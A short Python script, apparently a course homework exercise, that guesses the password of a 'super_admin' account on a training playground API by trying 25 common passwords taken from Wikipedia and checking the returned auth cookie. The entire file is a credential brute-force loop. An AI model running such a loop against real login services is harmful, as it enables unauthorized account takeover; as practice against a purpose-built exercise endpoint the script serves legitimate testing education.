import requests

login = "super_admin"

pwd_list = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", \
    "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", \
    "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", \
    "888888", "princess", "dragon","password1", "123qwe"]
'''
 Getting a password list from 'https://en.wikipedia.org/wiki/List_of_the_most_common_passwords' using JS code in the browser console:
 ` let pwd_list=""; for (const td of $('table.wikitable:nth-child(9) > tbody:nth-child(2) > tr > td:last-child')) {pwd_list+=`\"${td.innerText}\", `}; console.log(pwd_list)`
'''

def check_status_code(response: requests.Response):
    if response.status_code != 200:
        print(f"Request to '{response.request.url}' failed. Exiting...")
        exit(1)

for pwd in pwd_list:
    data = {"login": {login}, "password": {pwd}}
    # Getting auth_cookie
    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    response = requests.post(url, data=data)
    check_status_code(response)
    auth_cookie = response.cookies.get("auth_cookie")
    if auth_cookie is not None:
        print(f"auth_cookie '{auth_cookie}' received")
        cookies = {"auth_cookie": auth_cookie}
        # Checking auth_cookie
        url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
        response = requests.post(url, cookies=cookies)
        check_status_code(response)
        result = response.text; print(f"Checking cookie returns: {result}")
        if result == "You are NOT authorized":
            print(f"Password '{pwd}' is wrong. Trying next ...")
            continue
        # Success!
        print(f"Success! Right password is '{pwd}'")
        exit(0)
    else:
        print("No auth_cookie returned")
        exit(1)
